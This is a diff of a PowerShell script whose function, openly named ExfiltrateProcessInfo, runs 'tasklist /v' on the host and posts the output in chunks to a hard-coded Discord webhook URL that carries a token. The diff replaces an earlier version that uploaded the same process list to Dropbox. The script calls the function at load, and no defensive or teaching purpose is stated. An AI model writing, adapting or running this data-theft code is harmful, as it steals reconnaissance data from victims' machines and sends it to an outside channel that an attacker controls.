@@ -1,35 +1,55 @@
 <#
-This function uploads the content of a file called "tasklist_output.txt" to Dropbox using Dropbox API.
+This function retrieves the list of running processes on the system
+and sends it as multiple messages to a Discord channel via a webhook if necessary.
 
-Firstly, a temporary file is created using the New-TemporaryFile cmdlet of PowerShell.
-
-Then, the tasklist /v command is used to get the running processes output on the computer.
-
-The output is then written to the temporary file using the Out-File cmdlet.
-
-The Dropbox API endpoint for uploading a file is set, and the API parameters such as the destination path of the file on Dropbox and access credentials are specified.
-
-Finally, the Invoke-RestMethod cmdlet of PowerShell is used to send an HTTP POST request to the Dropbox API and upload the file.
+### Steps:
+1. Get the task list with detailed information (`tasklist /v`).
+2. Convert the output into plain text format.
+3. If the message exceeds Discord's 2000 character limit, split it into multiple messages.
+4. Send each part as a separate message to Discord using a webhook.
 #>
+
 function ExfiltrateProcessInfo {
-	$localFilePath = New-TemporaryFile
-	$taskListOutput = tasklist /v
-	$taskListOutput | Out-File -FilePath $localFilePath
-	$dropboxFilePath = "/tasklist_output.txt"
+    # Step 1: Get the running processes
+    $taskListOutput = tasklist /v
+    
+    # Step 2: Prepare the data to be sent (convert to plain text)
+    $processInfo = $taskListOutput -join "`n"
+    
+    # Step 3: Define the Discord webhook URL (your provided webhook)
+    $discordWebhookUrl = "https://discord.com/api/webhooks/1322665023029645452/SHGcTVmDG5mpVZ1DDbYXpQyrWQJ25BYUK1ID55V0C8gC3syN6lpijpw_MsoDcrNy0V2I"
+    
+    # Step 4: Split the content into chunks if it exceeds Discord's 2000 character limit
+    $maxLength = 2000
+    $chunks = @()
+    
+    while ($processInfo.Length -gt $maxLength) {
+        # Split the content into smaller parts
+        $chunks += $processInfo.Substring(0, $maxLength)
+        $processInfo = $processInfo.Substring($maxLength)
+    }
+    
+    # Add the remaining part (if any)
+    if ($processInfo.Length -gt 0) {
+        $chunks += $processInfo
+    }
 
-	$accessToken = ""
-	$authHeader = @{Authorization = "Bearer $accessToken"}
+    # Step 5: Send each chunk as a separate message
+    try {
+        foreach ($chunk in $chunks) {
+            $body = @{
+                "content" = "List of running processes:`n$chunk"
+            }
 
-	$fileContent = Get-Content $localFilePath
-
-	$uploadUrl = "https://content.dropboxapi.com/2/files/upload"
-
-	$headers = @{}
-	$headers.Add("Authorization", "Bearer $accessToken")
-	$headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
-	$headers.Add("Content-Type", "application/octet-stream")
-
-	Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $fileContent
+            # Send the POST request to Discord webhook for each chunk
+            Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"
+            Write-Host "Process info chunk sent successfully to Discord."
+        }
+    }
+    catch {
+        Write-Host "Error while sending process info to Discord: $_"
+    }
 }
 
+# Call the function to exfiltrate the process info
 ExfiltrateProcessInfo
